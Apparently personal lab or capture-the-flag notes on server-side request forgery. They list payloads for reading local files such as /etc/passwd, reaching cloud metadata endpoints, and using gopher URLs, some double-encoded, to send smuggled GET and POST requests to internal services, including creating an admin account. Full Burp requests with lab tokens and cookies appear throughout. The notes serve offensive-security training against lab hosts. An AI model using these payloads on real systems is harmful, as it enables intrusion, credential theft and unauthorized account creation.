#### SSRF

```
curl http://127.0.0.1:8080

```

##### Private IP addresses

|IP ADDRESS RANGE	|NUMBER OF ADDRESSES|
|-----------------|-------------------|
|10.0.0.0/8	|16,777,216|
|172.16.0.0/12	|1,048,576|
|192.168.0.0/16	|65,536|

An attacker exploiting an SSRF vulnerability in an AWS cloud environment could potentially access this metadata service and obtain sensitive data at 169.254.169.254.
Others provide access through DNS, such as Google Cloud, which uses metadata.google.internal.
https://cloud.google.com/compute/docs/metadata/overview

Start a webserver on kali and try to access it in case the response is not available.

Sol:
check which page is requested. Then touched that page and started python http server and got flag.


http://metadata.web200.local/latest/meta-data/flag

http://localhost/flag


##### Schemes

http
https
file
ftp

file:///c:/windows/win.ini

file:///etc/passwd

Curl supports gopher protocol

```
curl gopher://127.0.0.1:9000/_GET%20/hello_gopher%20HTTP/1.1
```

we may need to include a line feed character (%0a) and a Host header. Since we are including the GET request as part of the path, we can easily change it to a different HTTP method

we may need to include a line feed character (%0a) and a Host header. Since we are including the GET request as part of the path, we can easily change it to a different HTTP method.

We need to include port 80 in our URL because the Gopher service normally runs on port 70.


```
gopher://127.0.0.1:80/_GET%20/status%20HTTP/1.1%0a

gopher://127.0.0.1:80/_POST%20/status%20HTTP/1.1%0a

```

our browser URL-encodes the percent signs, creating double encoded3 values.
If we tried to replicate this attack using curl on our Kali VM, we would encounter a problem. The application does not receive the exact payload we've entered in our browser.
The application first processes it as the request to /preview. This request triggers the SSRF attack, which sends another request, in this case the GET request to 127.0.0.1/status. Since the payload values are double encoded, the application does not fully decoded the payload until it processes the second request.

In the case of the percent sign, this resulted in each space character being double URL-encoded as "%2520". The application essentially processes our request twice. The application first processes it as the request to /preview. This request triggers the SSRF attack, which sends another request, in this case the GET request to 127.0.0.1/status. Since the payload values are double encoded, the application does not fully decoded the payload until it processes the second request.


If we were to replicate this attack from curl or in the Repeater tool of Burp Suite, we would need to double encode any non-alphanumeric characters as well.

1 (Wikipedia, 2021), https://en.wikipedia.org/wiki/File_URI_scheme ↩︎

2 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Gopher_(protocol) ↩︎

3 (OWASP Foundation, 2021), https://owasp.org/www-community/Double_Encoding ↩︎


From status page get location of config file.

file:///app/config.ini


http://ssrf-sandbox/protectedflag?password=twasbryllyg

-----
Below 3 flag are same:

http://backend/flag

gopher://127.0.0.1:80/_GET%20/gateway/flag?apiKey=chesirecat%20HTTP/1.1%0a

gopher://backend:80/_GET%20/flag?apiKey=chesirecat%20HTTP/1.1%0a

------
Below 2 flags are same:

http://localhost/flag

gopher://localhost:80/_GET%20/flag%20%0a

```
POST /preview HTTP/1.1
Host: ssrf-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
Origin: http://ssrf-sandbox
Connection: close
Referer: http://ssrf-sandbox/preview
Upgrade-Insecure-Requests: 1

url=gopher%3A%2F%2F127.0.0.1%3A80%2F_GET%2520%2Fgateway%3FapiKey%3Dchesirecat%2520HTTP%2F1.1%250a&utility=curl
```
Tried below...  worked
```
POST /preview HTTP/1.1
Host: ssrf-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 280
Origin: http://ssrf-sandbox
Connection: close
Referer: http://ssrf-sandbox/preview
Upgrade-Insecure-Requests: 1

url=gopher%3A%2F%2Fbackend%3A80%2F_POST%2520%2Flogin%2520HTTP%2F1.1%250d%250aHost%3A%2520backend%3A80%250d%250aContent-Type%3A%2520application%2Fx-www-form-urlencoded%250d%250aContent-Length%3A%252041%250d%250a%250d%250ausername%3Dwhite.rabbit%26password%3Ddontbelate&utility=curl

```

In browser URL field:
```
gopher://backend:80/_POST%20/login%20HTTP/1.1%0d%0aHost:%20backend:80%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2041%0d%0a%0d%0ausername=white.rabbit&password=dontbelate

```

Had to access using backend as /gatewaylogin didn't support POST Method


###### Groupoffice

```
POST /index.php?r=summary/rssFeed/proxy&security_token=S37qk6Z1CJnNQtKAxETM HTTP/1.1
Host: groupoffice
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en
Accept-Encoding: gzip, deflate
Authorization: Bearer 6427000c78ba4493edc30d6876c9af22e4879b01c5b19
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 61
Origin: http://groupoffice
Connection: close
Referer: http://groupoffice/?SET_LANGUAGE=en
Cookie: groupoffice=99cm83u18a7bliboqj522sv8a1; accessToken=6427000c78ba4493edc30d6876c9af22e4879b01c5b19; GO_LANGUAGE=en

feed=http%3A%2F%2Fflag%2f&security_token=S37qk6Z1CJnNQtKAxETM

```

Use apache server. That way you will get the client utility accessing the url.


Req:

```
gopher://127.0.0.1:80/_POST /api/admin/create HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

username=white.rabbit&password=dontbelate
```
Single encoding:
```
gopher://127.0.0.1:80/_POST%20/api/admin/create%20HTTP/1.1%0d%0aHost:%20127.0.0.1:80%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2041%0d%0a%0d%0ausername=white.rabbit&password=dontbelate

```
Double encoding:
```
gopher%3A%2F%2F127.0.0.1%3A80%2F_POST%2520%2Fapi%2Fadmin%2Fcreate%2520HTTP%2F1.1%250d%250aHost%3A%2520127.0.0.1%3A80%250d%250aContent-Type%3A%2520application%2Fx-www-form-urlencoded%250d%250aContent-Length%3A%252041%250d%250a%250d%250ausername%3Dwhite.rabbit%26password%3Ddontbelate
```
